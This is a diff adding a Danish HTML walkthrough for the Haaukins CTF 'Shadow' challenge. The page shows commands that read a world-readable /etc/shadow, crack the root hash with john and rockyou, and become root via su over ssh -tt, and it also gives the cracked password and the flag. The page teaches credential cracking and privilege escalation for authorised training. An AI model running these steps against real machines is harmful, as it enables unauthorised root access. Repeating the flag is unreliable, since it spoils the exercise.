@@ -1,0 +1,36 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: Shadow — tutorial (læsbar /etc/shadow)</title>
+<meta name="description" content="Guide til Haaukins Shadow: en world-readable /etc/shadow lader dig knække root-hashen (sha512crypt) og blive root via su.">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>Shadow</h1>
+<p class="subtitle">Læs root-hashen fra en world-readable /etc/shadow og knæk den.</p>
+<div class="badges"><span class="badge cat">Boot2Root</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+
+<h2>Trin for trin</h2>
+<pre><code>ssh user1@shadow.hkn    # password: start
+ls -la /etc/shadow      # -rw-r--r-- -> WORLD-READABLE (misconfig!)
+john --format=sha512crypt --wordlist=rockyou.txt root.hash   # -> conga
+printf 'conga\n' | ssh -tt user1@shadow.hkn 'su root -c "cat /home/root/flag.txt"'</code></pre>
+             <p>Direkte root-SSH er slået fra (<code>PermitRootLogin no</code>), så brug <code>su</code> via en pty
+             (<code>ssh -tt</code>).</p>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Flag: <span class="flag">DDC{Prot3ct_y0ur_s3cr3ts}</span></p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li><code>/etc/shadow</code> skal være <code>-rw-r-----</code>; world-readable = enhver kan knække root.</li><li><code>su</code> kræver en pty → <code>ssh -tt</code>, password pipes ind.</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
